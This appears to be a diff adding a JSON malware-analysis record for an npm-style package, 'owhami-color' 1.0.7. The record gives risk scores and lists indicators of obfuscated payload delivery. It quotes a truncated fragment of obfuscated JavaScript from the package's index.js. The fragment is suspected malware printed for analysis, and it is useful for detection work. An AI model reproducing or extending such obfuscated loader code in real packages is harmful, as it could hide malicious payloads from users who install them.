@@ -1,0 +1,29 @@
+{
+    "package_metadata": {
+        "name": "owhami-color",
+        "version": "1.0.7"
+    },
+    "behavior_analysis": {
+        "file_operations": [],
+        "network_activity": [],
+        "process_actions": []
+    },
+    "malicious_code": {
+        "suspicious_modules": [
+            {
+                "filename": "package/index.js",
+                "code_snippet": "var _0x393fea=_0x2a59;(function(_0x2a5329,_0x3d50be){var _0xf2746f=_0x2a59,_0x130b58=_0x2a5329();while(!![]){try{var _0x318345=parseInt(_0xf2746f(0x1b2))/(-0x7eb*-0x1+-0x19d9+0x11ef)*(-parseInt(_0xf2746f(0x171))/(-0xc69*0x2+0x2074+0x8*-0xf4..."
+            }
+        ]
+    },
+    "threat_assessment": {
+        "malware_score": 0.75,
+        "risk_score": 0.85,
+        "confidence": 0.9,
+        "indicators": [
+            "Obfuscated payload delivery",
+            "High entropy Base64-encoded strings",
+            "Common obfuscation method used by malware"
+        ]
+    }
+}
